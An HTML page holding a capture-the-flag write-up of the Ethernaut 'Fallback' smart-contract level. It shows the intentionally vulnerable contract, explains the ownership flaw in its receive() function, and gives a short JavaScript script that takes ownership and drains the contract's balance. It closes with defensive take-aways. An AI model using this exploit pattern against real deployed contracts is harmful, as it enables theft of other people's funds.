@@ -1,0 +1,155 @@
+<!doctype html><html lang=en><head><meta charset=utf-8><meta name=description content="Goal  take ownership reduce the balance to 0 by withdrawing all the funds  Contract Analysis 1 2 3 4  // SPDX-License-Identifier: MIT pragma solidity ^0."><title>01. Fallback</title><meta name=viewport content="width=device-width,initial-scale=1"><link rel="shortcut icon" type=image/png href=https://hakbrain.xyz//icon.png><link href=https://hakbrain.xyz/styles.f40f9c8ac1c106641723dab5233fc67c.min.css rel=stylesheet><link href=https://hakbrain.xyz/styles/_light_syntax.86a48a52faebeaaf42158b72922b1c90.min.css rel=stylesheet id=theme-link><script src=https://hakbrain.xyz/js/darkmode.8bfc78cc60cc5da6df81ec79c82c3775.min.js></script>
+<script src=https://hakbrain.xyz/js/util.9825137f5e7825e8553c68ce39ac9e44.min.js></script>
+<link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.15.1/dist/katex.min.css integrity=sha384-R4558gYOUz8mP9YWpZJjofhk+zx0AS11p36HnD2ZKj/6JR5z27gSSULCNHIRReVs crossorigin=anonymous><script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.1/dist/katex.min.js integrity=sha384-z1fJDqw8ZApjGO3/unPWUPsIymfsJmyrDVWC8Tv/a1HeOtGmkwNd/7xUS0Xcnvsx crossorigin=anonymous></script>
+<script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.1/dist/contrib/auto-render.min.js integrity=sha384-+XBljXPPiv+OzfbB3cVmLHf4hdUFHlWNZN5spNQ7rmHTXpd7WvJum6fIACpNNfIR crossorigin=anonymous></script>
+<script src=https://unpkg.com/@floating-ui/core@0.7.3></script>
+<script src=https://unpkg.com/@floating-ui/dom@0.5.4></script>
+<script src=https://hakbrain.xyz/js/popover.abe6a51cc7138c5dff00f151dd627ad1.min.js></script>
+<script src=https://hakbrain.xyz/js/code-title.b35124ad8db0ba37162b886afb711cbc.min.js></script>
+<script src=https://hakbrain.xyz/js/clipboard.c20857734e53a3fb733b7443879efa61.min.js></script>
+<script src=https://hakbrain.xyz/js/callouts.7723cac461d613d118ee8bb8216b9838.min.js></script>
+<script>const BASE_URL="https://hakbrain.xyz/",fetchData=Promise.all([fetch("https://hakbrain.xyz/indices/linkIndex.1786e042536fbf245ce2ed4ff6d7dba1.min.json").then(e=>e.json()).then(e=>({index:e.index,links:e.links})),fetch("https://hakbrain.xyz/indices/contentIndex.40a4dd10fdc4800aaafb729c4666ecfb.min.json").then(e=>e.json())]).then(([{index:e,links:t},n])=>({index:e,links:t,content:n})),render=()=>{const e=new URL(BASE_URL),t=e.pathname,n=window.location.pathname,s=t==n;addCopyButtons(),addTitleToCodeBlocks(),addCollapsibleCallouts(),initPopover("https://hakbrain.xyz",!0,!0);const o=document.getElementById("footer");if(o){const e=document.getElementById("graph-container");if(!e)return requestAnimationFrame(render);e.textContent="";const t=s&&!1;drawGraph("https://hakbrain.xyz",t,[{"/moc":"#4388cc"}],t?{centerForce:1,depth:-1,enableDrag:!0,enableLegend:!1,enableZoom:!0,fontSize:.5,linkDistance:1,opacityScale:3,repelForce:1,scale:1.4}:{centerForce:1,depth:1,enableDrag:!0,enableLegend:!1,enableZoom:!0,fontSize:.6,linkDistance:1,opacityScale:3,repelForce:2,scale:1.2})}},init=(e=document)=>{addCopyButtons(),addTitleToCodeBlocks(),renderMathInElement(e.body,{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1}],throwOnError:!1})}</script><script type=module>
+    import { attachSPARouting } from "https:\/\/hakbrain.xyz\/js\/router.9d4974281069e9ebb189f642ae1e3ca2.min.js"
+    attachSPARouting(init, render)
+  </script></head><script async src="https://www.googletagmanager.com/gtag/js?id=G-XYFD95KB4J"></script>
+<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-XYFD95KB4J",{anonymize_ip:!1})}</script><body><div id=search-container><div id=search-space><input autocomplete=off id=search-bar name=search type=text aria-label=Search placeholder="Search for something..."><div id=results-container></div></div></div><script src=https://cdn.jsdelivr.net/npm/flexsearch@0.7.21/dist/flexsearch.bundle.js integrity="sha256-i3A0NZGkhsKjVMzFxv3ksk0DZh3aXqu0l49Bbh0MdjE=" crossorigin=anonymous defer></script>
+<script defer src=https://hakbrain.xyz/js/full-text-search.24827f874defbbc6d529926cbfcfb493.min.js></script><div class=singlePage><header><h1 id=page-title><a href=https://hakbrain.xyz/>🕸️ H@kBr4in</a></h1><div class=spacer></div><div id=search-icon><p>Search</p><svg tabindex="0" aria-labelledby="title desc" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 19.9 19.7"><title id="title">Search Icon</title><desc id="desc">Icon to open search</desc><g class="search-path" fill="none"><path stroke-linecap="square" d="M18.5 18.3l-5.4-5.4"/><circle cx="8" cy="8" r="7"/></g></svg></div><div class=darkmode><input class=toggle id=darkmode-toggle type=checkbox tabindex=-1>
+<label id=toggle-label-light for=darkmode-toggle tabindex=-1><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" id="dayIcon" viewBox="0 0 35 35" style="enable-background:new 0 0 35 35"><title>Light Mode</title><path d="M6 17.5C6 16.672 5.328 16 4.5 16h-3C.672 16 0 16.672.0 17.5S.672 19 1.5 19h3C5.328 19 6 18.328 6 17.5zM7.5 26c-.414.0-.789.168-1.061.439l-2 2C4.168 28.711 4 29.086 4 29.5 4 30.328 4.671 31 5.5 31c.414.0.789-.168 1.06-.44l2-2C8.832 28.289 9 27.914 9 27.5 9 26.672 8.329 26 7.5 26zm10-20C18.329 6 19 5.328 19 4.5v-3C19 .672 18.329.0 17.5.0S16 .672 16 1.5v3C16 5.328 16.671 6 17.5 6zm10 3c.414.0.789-.168 1.06-.439l2-2C30.832 6.289 31 5.914 31 5.5 31 4.672 30.329 4 29.5 4c-.414.0-.789.168-1.061.44l-2 2C26.168 6.711 26 7.086 26 7.5 26 8.328 26.671 9 27.5 9zM6.439 8.561C6.711 8.832 7.086 9 7.5 9 8.328 9 9 8.328 9 7.5c0-.414-.168-.789-.439-1.061l-2-2C6.289 4.168 5.914 4 5.5 4 4.672 4 4 4.672 4 5.5c0 .414.168.789.439 1.06l2 2.001zM33.5 16h-3c-.828.0-1.5.672-1.5 1.5s.672 1.5 1.5 1.5h3c.828.0 1.5-.672 1.5-1.5S34.328 16 33.5 16zM28.561 26.439C28.289 26.168 27.914 26 27.5 26c-.828.0-1.5.672-1.5 1.5.0.414.168.789.439 1.06l2 2C28.711 30.832 29.086 31 29.5 31c.828.0 1.5-.672 1.5-1.5.0-.414-.168-.789-.439-1.061l-2-2zM17.5 29c-.829.0-1.5.672-1.5 1.5v3c0 .828.671 1.5 1.5 1.5s1.5-.672 1.5-1.5v-3C19 29.672 18.329 29 17.5 29zm0-22C11.71 7 7 11.71 7 17.5S11.71 28 17.5 28 28 23.29 28 17.5 23.29 7 17.5 7zm0 18c-4.136.0-7.5-3.364-7.5-7.5s3.364-7.5 7.5-7.5 7.5 3.364 7.5 7.5S21.636 25 17.5 25z"/></svg></label><label id=toggle-label-dark for=darkmode-toggle tabindex=-1><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" id="nightIcon" viewBox="0 0 100 100" style="enable-background='new 0 0 100 100'"><title>Dark Mode</title><path d="M96.76 66.458c-.853-.852-2.15-1.064-3.23-.534-6.063 2.991-12.858 4.571-19.655 4.571C62.022 70.495 50.88 65.88 42.5 57.5 29.043 44.043 25.658 23.536 34.076 6.47c.532-1.08.318-2.379-.534-3.23-.851-.852-2.15-1.064-3.23-.534-4.918 2.427-9.375 5.619-13.246 9.491-9.447 9.447-14.65 22.008-14.65 35.369.0 13.36 5.203 25.921 14.65 35.368s22.008 14.65 35.368 14.65c13.361.0 25.921-5.203 35.369-14.65 3.872-3.871 7.064-8.328 9.491-13.246C97.826 68.608 97.611 67.309 96.76 66.458z"/></svg></label></div></header><article><h1>01. Fallback</h1><p class=meta>Last updated
+Oct 11, 2022
+<a href=https://github.com/vlagh3/hakbrain/tree/hugo/content/write-ups/ethernaut/01.%20Fallback.md rel=noopener>Edit Source</a></p><ul class=tags><li><a href=https://hakbrain.xyz/tags/writeups/>Writeups</a></li></ul><aside class=mainTOC><details><summary>Table of Contents</summary><nav id=TableOfContents><ol><li><a href=#goal>Goal</a></li><li><a href=#contract-analysis>Contract Analysis</a></li><li><a href=#taking-ownership--getting-that->Taking ownership & getting that 💸</a></li><li><a href=#take-aways>Take-Aways</a></li><li><a href=#refs>Refs</a></li><li><a href=#see-also>See Also</a></li></ol></nav></details></aside><a href=#goal><h2 id=goal><span class=hanchor arialabel=Anchor># </span>Goal</h2></a><ul><li>take ownership</li><li>reduce the balance to 0 by withdrawing all the funds</li></ul><a href=#contract-analysis><h2 id=contract-analysis><span class=hanchor arialabel=Anchor># </span>Contract Analysis</h2></a><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-solidity data-lang=solidity><span class=line><span class=cl><span class=c1>// SPDX-License-Identifier: MIT
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>pragma solidity</span> <span class=o>^</span><span class=mi>0</span><span class=p>.</span><span class=mi>6</span><span class=p>.</span><span class=mi>0</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=s>&#39;@openzeppelin/contracts/math/SafeMath.sol&#39;</span><span class=p>;</span>
+</span></span></code></pre></td></tr></table></div></div><p>We first notice that it uses an external util contract <code>SafeMath.sol</code>. With a simple search on the Internet
+<a href=https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/math/SafeMath.sol rel=noopener>we find it</a> & as its name says, there&rsquo;s just a bunch of math functions such as: <code>mod</code>, <code>sub</code>, <code>div</code>, etc. Many contracts make use of this library which is designed to implement safe math operations such that it prevents overflows & other logic errors that would probably come if every developer had to implement their own version.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-solidity data-lang=solidity><span class=line><span class=cl><span class=kd>contract</span> <span class=nc>Fallback</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>	<span class=kn>using</span> <span class=n>SafeMath</span> <span class=k>for</span> <span class=kt>uint256</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	<span class=kd>mapping</span><span class=p>(</span><span class=kt>address</span> <span class=o>=&gt;</span> <span class=kt>uint</span><span class=p>)</span> <span class=k>public</span> <span class=n>contributions</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	<span class=kt>address</span> <span class=k>payable</span> <span class=k>public</span> <span class=n>owner</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	
+</span></span><span class=line><span class=cl>	<span class=kd>constructor</span><span class=p>()</span> <span class=k>public</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>		<span class=n>owner</span> <span class=o>=</span> <span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>		<span class=n>contributions</span><span class=p>[</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>]</span> <span class=o>=</span> <span class=mi>1000</span> <span class=o>*</span> <span class=p>(</span><span class=mi>1</span> <span class=kc>ether</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>	<span class=p>}</span>
+</span></span><span class=line><span class=cl>	<span class=p>...</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>First it&rsquo;s
+<a href=https://docs.soliditylang.org/en/develop/contracts.html#using-for rel=noopener>using</a> <code>SafeMath</code>
+<a href=https://docs.soliditylang.org/en/develop/contracts.html#using-for rel=noopener>for</a> <code>uint256</code>: that is to prevent overflows when working with <code>uints</code> <em>(see above)</em>. Then we define <code>contributions</code> which is probably going to keep track of all the addresses that contribute <em>(i.e send ether)</em> to the contract & it also makes the address of the owner publicly available and
+<a href=https://docs.soliditylang.org/en/latest/types.html#address rel=noopener>payable</a>.</p><p>In the
+<a href=https://medium.com/coinmonks/solidity-tutorial-all-about-constructors-46a10610336 rel=noopener>constructor</a>, which runs only once on deployment, we set the owner of the contract to the
+<a href="https://docs.soliditylang.org/en/v0.8.11/units-and-global-variables.html?highlight=msg#special-variables-and-functions" rel=noopener>special variable</a> <code>msg.sender</code>, that is the address of the one who first deployed the contract. Afterwards, we assign him a contribution of <code>1000ETH</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-solidity data-lang=solidity><span class=line><span class=cl><span class=kd>modifier</span> <span class=nf>onlyOwner</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>	<span class=nb>require</span><span class=p>(</span>
+</span></span><span class=line><span class=cl>		<span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span> <span class=o>==</span> <span class=n>owner</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>		<span class=s>&#34;caller is not the owner&#34;</span>
+</span></span><span class=line><span class=cl>	<span class=p>);</span>
+</span></span><span class=line><span class=cl>	<span class=k>_</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>Then we define a
+<a href=https://medium.com/coinmonks/solidity-tutorial-all-about-modifiers-a86cf81c14cb rel=noopener>modifier</a> <em>(think of it as an attachment to functions that automatically checks a condition prior to executing the function)</em> which will check if the caller is the owner. This will be probably used in one of the functions, so let&rsquo;s take a look @ them:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-solidity data-lang=solidity><span class=line><span class=cl><span class=c1>// Handle contributions from addresses
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=kd>function</span> <span class=nf>contribute</span><span class=p>()</span> <span class=k>public</span> <span class=k>payable</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>	<span class=c1>// Cannot contribute unless the nr of
+</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=c1>// ether is greater than 0.001 ether
+</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=c1>// NOTE: msg.value is in wei
+</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=nb>require</span><span class=p>(</span><span class=nb>msg</span><span class=p>.</span><span class=nb>value</span> <span class=o>&lt;</span> <span class=mi>0</span><span class=p>.</span><span class=mi>001</span> <span class=kc>ether</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>	<span class=n>contributions</span><span class=p>[</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>]</span> <span class=o>+=</span> <span class=nb>msg</span><span class=p>.</span><span class=nb>value</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>	<span class=c1>// Change the owner of the contract to the highest contributor
+</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=k>if</span><span class=p>(</span><span class=n>contributions</span><span class=p>[</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>]</span> <span class=o>&gt;</span> <span class=n>contributions</span><span class=p>[</span><span class=n>owner</span><span class=p>])</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>		<span class=n>owner</span> <span class=o>=</span> <span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	<span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1>// Retrieves all the contributions for the address that calls 
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=kd>function</span> <span class=nf>getContribution</span><span class=p>()</span> <span class=k>public</span> <span class=k>view</span> <span class=k>returns</span> <span class=p>(</span><span class=kt>uint</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>	<span class=k>return</span> <span class=n>contributions</span><span class=p>[</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>];</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1>// Make a withdraw transaction only 
+</span></span></span><span class=line><span class=cl><span class=c1>// if the owner is the sender
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=kd>function</span> <span class=nf>withdraw</span><span class=p>()</span> <span class=k>public</span> <span class=n>onlyOwner</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>	<span class=n>owner</span><span class=p>.</span><span class=nb>transfer</span><span class=p>(</span><span class=kt>address</span><span class=p>(</span><span class=nb>this</span><span class=p>).</span><span class=nb>balance</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>Keeping in mind our <a class="internal-link broken"></a>, the <code>contribute</code> function should peek our interest, since it modifies who owns the contract => can <code>withdraw</code> funds if we find a way to have the most contributions. Since <code>1000ETH</code> is a lot of money, we only have 2 options:</p><ul><li>trick the contract in thinking that we have more</li><li>find another piece of code that changes the owner</li></ul><p>Luckily for us we haven&rsquo;t yet looked at the last piece of our contract: the <code>receive()</code> function which also tinkers with who is the owner of the contract</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-solidity data-lang=solidity><span class=line><span class=cl><span class=n>receive</span><span class=p>()</span> <span class=k>external</span> <span class=k>payable</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>	<span class=nb>require</span><span class=p>(</span><span class=nb>msg</span><span class=p>.</span><span class=nb>value</span> <span class=o>&gt;</span> <span class=mi>0</span> <span class=o>&amp;&amp;</span> <span class=n>contributions</span><span class=p>[</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>]</span> <span class=o>&gt;</span> <span class=mi>0</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>	<span class=n>owner</span> <span class=o>=</span> <span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>So we first check for the following:</p><ul><li>does the amount of wei <em>(i.e <code>msg.value</code>)</em> sent in the transaction is more than 0</li><li>is the sender already a contributor?</li></ul><p>If those checks pass, we set the owner of the contract to the address of the sender. Notice that the <code>receive()</code> function is a
+<a href=https://docs.soliditylang.org/en/v0.8.12/contracts.html#receive-ether-function rel=noopener>special one</a> that allows us to send Ether to the contract through <code>.send()</code> or <code>.transfer()</code>.
+<a href=https://docs.soliditylang.org/en/v0.8.12/contracts.html#fallback-function rel=noopener>Fallback functions</a> are used to handle logic in 2 scenarios:</p><ul><li>contract received ether and no data</li><li>contract received data but no function matched the function called</li></ul><a href=#taking-ownership--getting-that-><h2 id=taking-ownership--getting-that-><span class=hanchor arialabel=Anchor># </span>Taking ownership & getting that 💸</h2></a><p>Now that we actually understand how the smart contracts operates, let&rsquo;s start interacting with it. First we need to become a contributor so let&rsquo;s send 1
+<a href=/ rel=noopener class=internal-link data-src=/>wei</a> to it:</p><p><img src="/write-ups/images/Pasted image 20221011205320.png" width=auto></p><p>We confirmed that we&rsquo;re now a contributor so let&rsquo;s try accessing the <code>receive()</code> fallback function by sending 1 Wei with <code>sendTransaction()</code> & check if we successfully changed ownership to ourselves</p><p><img src="/write-ups/images/Pasted image 20221011205601.png" width=auto></p><p>💣 it worked, now let&rsquo;s just <code>withdraw()</code> & enjoy our stolen funds 🫠</p><p><img src="/write-ups/images/Pasted image 20221011205901.png" width=auto></p><p>I thought it might be interesting to automate the process of exploiting for each challenge so here&rsquo;s some javascript to automatically solve your level:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=kr>const</span> <span class=nx>targetAddr</span> <span class=o>=</span> <span class=s1>&#39;&lt;PASTE_INSTANCE_ADDR_HERE&gt;&#39;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=sb>`Exploiting level 1 for target @ </span><span class=si>${</span><span class=nx>targetAddr</span><span class=si>}</span><span class=sb>...`</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=s1>&#39;Becoming a contributor with 1 Wei...&#39;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=kr>await</span> <span class=nx>contract</span><span class=p>.</span><span class=nx>contribute</span><span class=p>({</span><span class=nx>value</span><span class=o>:</span> <span class=mi>1</span><span class=p>})</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=s1>&#39;Changing ownership to ourselves...&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=kr>await</span> <span class=nx>contract</span><span class=p>.</span><span class=nx>owner</span><span class=p>()</span>
+</span></span><span class=line><span class=cl><span class=kr>await</span> <span class=nx>contract</span><span class=p>.</span><span class=nx>sendTransaction</span><span class=p>({</span><span class=nx>value</span><span class=o>:</span> <span class=mi>1</span><span class=p>})</span>
+</span></span><span class=line><span class=cl><span class=kr>await</span> <span class=nx>contract</span><span class=p>.</span><span class=nx>owner</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=s1>&#39;Draining the contract...&#39;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=kr>await</span> <span class=nx>contract</span><span class=p>.</span><span class=nx>withdraw</span><span class=p>()</span>
+</span></span></code></pre></td></tr></table></div></div><a href=#take-aways><h2 id=take-aways><span class=hanchor arialabel=Anchor># </span>Take-Aways</h2></a><ul><li>If you implement a fallback function, keep it simple</li><li>Use fallback functions<ul><li>to <strong>emit payment events to the transaction log</strong></li><li>to check simple conditional requirements</li></ul></li><li>Think twice when it comes to changing ownership of the contract & fund transfers</li></ul><hr><a href=#refs><h2 id=refs><span class=hanchor arialabel=Anchor># </span>Refs</h2></a><ul><li><a href=https://docs.soliditylang.org/en/v0.8.17/ rel=noopener>Solidity Docs</a></li><li><a class="internal-link broken">refs/+ Basics of Solidity and Smart Contracts</a></li></ul><a href=#see-also><h2 id=see-also><span class=hanchor arialabel=Anchor># </span>See Also</h2></a><ul><li><a href=/write-ups/Ethernaut-Wargame rel=noopener class=internal-link data-src=/write-ups/Ethernaut-Wargame>write-ups/Ethernaut Wargame</a></li></ul></article><hr><div class=page-end id=footer><div class=backlinks-container><h3>Backlinks</h3><ul class=backlinks><li>No backlinks found</li></ul></div><div><script src=https://cdn.jsdelivr.net/npm/d3@6.7.0/dist/d3.min.js integrity="sha256-+7jaYCp29O1JusNWHaYtgUn6EhuP0VaFuswhNV06MyI=" crossorigin=anonymous></script><h3>Interactive Graph</h3><div id=graph-container></div><style>:root{--g-node:var(--secondary);--g-node-active:var(--primary);--g-node-inactive:var(--visited);--g-link:var(--outlinegray);--g-link-active:#5a7282}</style><script src=https://hakbrain.xyz/js/graph.abd4bc2af3869a96524d7d23b76152c7.js></script></div></div><div id=contact_buttons><footer><p>Made by Vl@gh3 using <a href=https://github.com/jackyzha0/quartz>Quartz</a>, © 2022</p><ul><li><a href=https://hakbrain.xyz/>Home</a></li><li><a href=https://twitter.com/vlaghe1>Twitter</a></li><li><a href=https://github.com/vlagh3>Github</a></li></ul></footer></div></div></body></html>
